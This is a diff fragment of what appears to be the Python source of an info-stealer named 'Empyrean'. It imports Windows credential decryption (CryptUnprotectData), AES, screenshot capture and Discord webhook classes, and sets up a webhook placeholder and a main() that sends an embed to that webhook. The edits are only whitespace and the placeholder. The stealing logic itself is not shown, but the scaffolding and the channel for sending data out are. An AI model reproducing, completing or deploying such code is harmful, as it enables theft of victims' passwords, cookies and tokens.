@@ -9,7 +9,7 @@ import sqlite3
 import uuid
 
 import requests
-import wmi
+import wmi 
 from Crypto.Cipher import AES
 from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from PIL import ImageGrab
@@ -19,11 +19,11 @@ from win32crypt import CryptUnprotectData
 
 # Config
 
-webhook = "webhook"
+webhook = "WEBHOOK_URL"
 
-# Config
+# Config 
 
-def main(webhook: str) -> None:
+def main(webhook: str) -> None: 
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Empyrean", color=0x000000)
     
